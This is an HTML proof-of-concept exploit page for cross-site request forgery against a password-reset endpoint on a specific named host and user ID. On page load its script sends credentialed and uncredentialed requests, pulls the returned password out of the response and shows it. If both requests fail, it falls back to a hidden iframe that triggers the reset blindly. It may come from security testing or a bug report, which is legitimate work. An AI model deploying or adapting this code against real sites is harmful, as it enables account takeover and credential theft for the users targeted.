<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CSRF PoC - Password Reset</title>
  <style>
    body {
      background: #111;
      color: #0f0;
      font-family: monospace;
      text-align: center;
      padding: 20px;
    }
    #status { color: #ff0; font-size: 1.2em; margin: 20px; }
    #password { color: #f00; font-size: 1.5em; margin: 20px; }
  </style>
</head>
<body>
  <h2>CSRF PoC - Password Reset userId=3767</h2>
  <p id="status">Firing CSRF...</p>
  <p id="password"></p>

  <script>
    var TARGET = 'https://test.ramotyeda.com/settings/ResetPassword?userId=3767';
    var statusEl = document.getElementById('status');
    var passwordEl = document.getElementById('password');

    function extractPasswordTag(xml) {
      var match = xml.match(/<password>.*?<\/password>/);
      return match ? match[0] : null;
    }

    // Attempt 1: XHR with credentials (sends cookies, reads response if CORS allows)
    function tryWithCredentials() {
      return new Promise(function(resolve, reject) {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', TARGET, true);
        xhr.withCredentials = true;
        xhr.onload = function() {
          var tag = extractPasswordTag(xhr.responseText);
          if (tag) resolve(tag);
          else reject('No password in response');
        };
        xhr.onerror = function() { reject('XHR with credentials blocked by CORS'); };
        xhr.send();
      });
    }

    // Attempt 2: fetch without credentials (CORS * allows reading response, no cookies sent)
    function tryWithoutCredentials() {
      return fetch(TARGET, { method: 'GET', credentials: 'omit' })
        .then(function(r) { return r.text(); })
        .then(function(xml) {
          var tag = extractPasswordTag(xml);
          if (tag) return tag;
          throw new Error('No password in response');
        });
    }

    // Auto-fire on page load
    window.addEventListener('DOMContentLoaded', function() {
      statusEl.innerText = 'Attempt 1: XHR with credentials...';

      tryWithCredentials()
        .then(function(tag) {
          statusEl.innerText = 'CSRF successful (XHR with credentials)';
          passwordEl.innerText = tag;
        })
        .catch(function(err) {
          statusEl.innerText = 'Credentials blocked by CORS wildcard. Attempt 2: fetch without credentials...';

          tryWithoutCredentials()
            .then(function(tag) {
              statusEl.innerText = 'CSRF successful (fetch without credentials)';
              passwordEl.innerText = tag;
            })
            .catch(function(err2) {
              statusEl.innerText = 'Both attempts failed. Falling back to blind CSRF (password reset still fires).';

              // Blind fire: iframe sends cookies, triggers the reset, but we can't read the response
              var iframe = document.createElement('iframe');
              iframe.style.display = 'none';
              iframe.src = TARGET;
              document.body.appendChild(iframe);
            });
        });
    });
  </script>
</body>
</html>
